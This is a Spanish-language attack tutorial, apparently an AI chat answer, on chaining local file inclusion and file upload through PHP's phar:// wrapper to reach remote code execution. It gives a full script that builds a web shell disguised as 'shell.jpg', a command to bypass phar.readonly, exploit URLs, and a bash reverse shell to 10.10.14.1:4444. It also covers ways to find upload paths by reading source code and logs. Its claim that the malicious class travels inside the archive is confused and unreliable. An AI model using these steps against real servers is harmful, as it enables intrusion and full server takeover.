

## 📌 ¿Qué es un `phar://` wrapper?

PHP incorpora un wrapper llamado **phar://** que permite acceder al contenido interno de archivos **PHAR** (PHP Archive), algo parecido a un `.zip` con metadata.

El punto clave:

> La metadata de un archivo PHAR **se deserializa automáticamente** cuando PHP interactúa con él.

Esto significa:

➡ Si tu archivo PHAR contiene un **objeto PHP malicioso** en su metadata,  
➡ y consigues que PHP lo **incluya o lo procese**,  
➡ **PHP ejecuta ese objeto → RCE**.

**No necesitas extensión `.phar`.**  
Puedes usar `.jpg`, `.png`, `.gif`, `.zip`, `.mp3`, lo que sea, mientras internamente sea un PHAR.

---

# 🧩 ¿Por qué esto funciona?

Porque PHP, al abrir:

```
phar://ruta/del/archivo
```

automáticamente:

1. **detecta si es un PHAR**
    
2. **lee su stub y metadata**
    
3. **deserializa los campos de metadata**
    
4. Si la metadata contiene objetos PHP → los construye y ejecuta métodos mágicos  
    como:
    
    - `__wakeup()`
        
    - `__destruct()`
        
    - `__toString()`
        
    - `__call()`
        

Muchos de estos pueden ser abusados para **RCE directa**.

---

# 🔥 ¿Dónde entra LFI?

Si tienes una LFI que permite wrappers:

```
?page=phar://uploads/imagen.jpg
```

Y tú puedes subir un archivo (o encontrar uno existente) que en realidad es un PHAR →

🔥 **El LFI hace que PHP deserialice el objeto malicioso**  
🔥 y se ejecute tu payload incrustado.

Es **LFI + Upload → RCE avanzado**.

---

# 🧱 Requisitos

Debe cumplirse:

- ✔ La aplicación tiene **LFI**
    
- ✔ El wrapper **phar://** NO está bloqueado
    
- ✔ Puedes subir un archivo o controlar uno existente
    
- ✔ El archivo subido puede ser tratado como PHAR internamente
    

No necesitas:

- extensión `.phar`
    
- que el servidor permita ejecución directa
    
- que la LFI permita ejecución
    
- que el archivo subido se interprete como PHP
    

Solo necesitas que **exista el archivo** y tú lo puedas pasar por phar://.

---

# 🧨 Flujo completo del ataque (versión profesional)

### 1️⃣ Crear un archivo PHAR malicioso

Ejemplo en PHP:

```php
<?php
class Evil {
    public function __destruct() {
        system($_GET['cmd']);
    }
}

$phar = new Phar('shell.jpg'); // puede ser cualquier nombre
$phar->startBuffering();

$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->setMetadata(new Evil()); // Objeto malicioso

$phar->addFromString('test.txt', 'contenido');

$phar->stopBuffering();
?>
```

Ejecutas esto en tu máquina:

```
php crear_phar.php
```

Y obtienes:

```
shell.jpg
```

Pero **internamente es un PHAR**, no un JPG.

---

### 2️⃣ Subes ese archivo al servidor

Queda algo así:

```
http://victima/uploads/shell.jpg
```

---

### 3️⃣ Explotas la LFI con phar://

```
?page=phar://uploads/shell.jpg&cmd=id
```

PHP:

- reconoce que el archivo real es un PHAR
    
- lee su metadata
    
- deserializa el objeto `Evil`
    
- ejecuta `__destruct()`
    
- que contiene:
    

```
system($_GET['cmd']);
```

🔥 **RCE asegurado.**

---

# ⚠️ **2. PERO necesitas hacer SOLO UN CAMBIO para que funcione en PHP moderno**

PHP moderno **NO permite crear PHAR sin que phar.readonly esté deshabilitado**.

Por defecto:

```
phar.readonly = 1
```

Debes deshabilitarlo TEMPORALMENTE:

```
php -d phar.readonly=0 crear_phar.php
```

Si no haces esto, te va a dar error tipo:

```
phar error: writing disabled by phar.readonly
```

**ES EL ÚNICO CAMBIO QUE NECESITAS.**

---

# 🟦 Ejecución correcta paso a paso

## 1. Guarda el script como:

```
crear_phar.php
```

## 2. Ejecuta así:

```bash
php -d phar.readonly=0 crear_phar.php
```

## 3. Verifica que se creó:

```
ls -l shell.jpg
```

### Opcional, revisa su contenido con:

```
php -r "print_r(new Phar('shell.jpg'));"
```

---

# 🚀 **3. El PHAR ya está listo para atacar**

Subes `shell.jpg` a la víctima.

Y explotas la LFI con:

```
?page=phar://uploads/shell.jpg&cmd=id
```

Y BOOOOM → **RCE ejecutando `__destruct()`**

---

# 🔥 **4. No necesitas modificar nada del payload a menos que quieras otra función**

Ahora mismo, tu PHAR ejecuta:

```
system($_GET['cmd']);
```

Perfecto para:

```
&cmd=id
&cmd=whoami
&cmd=ls
&cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'
```

Si quieres, puedes cambiar el método mágico por:

- `__wakeup()`
    
- `__toString()`
    
- `__invoke()`
    
- `__destruct()`
    

Pero **no es necesario** mientras uses `__destruct`.

---

# 🧩 **5. ¿Necesito que la víctima tenga alguna clase “Evil”?**

**No.**  
Tu clase `Evil` viaja dentro del PHAR como metadata serializada.

PHP no necesita tener esa clase definida localmente porque:

✔ El PHAR contiene la definición serializada  
✔ PHP crea un `__PHP_Incomplete_Class`  
✔ PERO los métodos mágicos siguen ejecutándose **si la clase existe al momento de deserializar**

**Entonces, para ejecución garantizada:**

- **Opción 1 (la más común):** subes también la clase o haces que el autoloader la cargue → más difícil.
    
- **Opción 2 (la mejor):** defines la clase antes de usar phar://
    
- **Opción 3 (la realista en CTF/HTB):** usar gadgets de la app real (Object Injection gadgets)
    

**PERO**  
en la mayoría de LFI + phar en entornos de reto (HTB, Vulnhub, OSCP style), **la clase sí está disponible**, o puedes abusar de clases existentes.

Si quieres full compatibilidad universal → Debemos usar un gadget de una clase QUE YA EXISTA en el servidor, no `Evil`.

Pero eso es nivel avanzado (Object Injection).

---


**FUNCIONA SOLO si cumples una condición clave:**

# ✅ Debes saber dónde queda el archivo que subiste

para luego poder apuntarlo con:

```
?page=phar://RUTA/AL/ARCHIVO
```

Si no sabes la ruta → **no puedes explotarlo**.

Pero te explico **exactamente qué necesitas y cómo obtenerlo**, porque esto es fácil si sabes cómo enumerar correctamente.

---

# 🧩 1. **¿Por qué necesitas saber la ruta exacta?**

Porque el wrapper `phar://` funciona así:

```
phar://ruta/al/archivo
```

Si la ruta es incorrecta:

- PHP no abrirá el archivo
    
- No deserializa la metadata
    
- No ejecuta tu payload
    

**Por eso necesitas conocer el path real en el servidor**, NO la ruta pública de la web.

---

# 🧨 2. **Tienes DOS formas de saber la ruta**

## 🟦 **A. Subida de archivos controlada por ti**

Si tú subes el archivo, normalmente:

- La web te devuelve la ruta pública  
    ejemplo:
    
    ```
    http://victima.com/uploads/avatar.jpg
    ```
    
- De esa ruta puedes inferir la ruta real del servidor (muy común):
    
    ```
    /var/www/html/uploads/avatar.jpg
    ```
    

O, si usas una LFI, puedes leer el código fuente de la web y ver el path exacto.

---

## 🟦 B. Encontrar rutas usando la propia LFI

Una LFI normal te permite leer archivos, por ejemplo:

```
?page=../../../../var/www/html/index.php
```

Con eso puedes inspeccionar:

- rutas internas
    
- configuraciones
    
- variables que indiquen dónde guarda imágenes
    

Muchos frameworks guardan uploads en rutas conocidas:

```
/var/www/html/uploads/
/var/www/html/images/
/var/www/html/resources/uploads/
/var/www/html/public/uploads/
```

Con LFI puedes leer el código del controlador:

```
?page=php://filter/convert.base64-encode/resource=/var/www/html/upload.php
```

Y ahí ves algo así:

```php
move_uploaded_file($_FILES['file']['tmp_name'], '/var/www/html/uploads/'.$newname);
```

Boom → ya sabes dónde va el archivo.

---

# 🧨 3. “¿Y si no sé dónde va el archivo?”

Entonces tienes estas opciones:

## 🔥 **1. Enumerar rutas comunes (muy efectivo)**

Prueba estas rutas típicas:

```
/var/www/html/uploads/
/var/www/html/upload/
/var/www/uploads/
/var/www/html/images/
/var/www/html/assets/
/srv/www/uploads/
/opt/uploads/
/home/www/uploads/
/var/www/html/public/uploads/
```

Usa LFI con php://filter para ver qué existe:

```
?page=php://filter/resource=/var/www/html/uploads/shell.jpg
```

Si NO lanza error → esa es la ruta correcta.

---

## 🔥 **2. Abusar de LFI para leer logs de subida**

Muchas apps registran:

```
Uploaded file saved to /var/www/html/uploads/avatar654.jpg
```

Intenta leer:

```
?page=/var/log/apache2/access.log
?page=/var/log/nginx/access.log
```

Ahí muchas veces aparece la ruta del archivo subido.

---

## 🔥 **3. Explorar rutas con “directory brute-force” pero con LFI**

Ejemplo:

```
?page=../../../../var/www/html/uploads/shell.jpg
```

Si obtienes error diferente → existe.

---

# 🧩 4. Cuando YA sabes la ubicación → PHAR RCE funciona perfecto

Ejemplo final:

Tu archivo subido quedó en:

```
/var/www/html/uploads/shell.jpg
```

Explotas así:

```
?page=phar:///var/www/html/uploads/shell.jpg&cmd=id
```

O si el script ya usa rutas relativas:

```
?page=phar://uploads/shell.jpg&cmd=id
```

Y boom.  
Se ejecuta el método malicioso de tu PHAR.

---

# 🔥 RESUMEN BRUTALMENTE CLARO

|Pregunta|Respuesta|
|---|---|
|¿Necesito saber dónde está el archivo?|**SÍ. 100% necesario.**|
|¿Se puede adivinar?|**Sí, con enumeración LFI.**|
|¿Se puede ver en los logs?|**Sí, muchos servidores lo muestran.**|
|¿Sirven rutas públicas?|**Sí, te ayudan a inferir el path interno.**|
|¿Un PHAR sin ruta precisa sirve?|**NO. No se deserializa. No hay RCE.**|

---
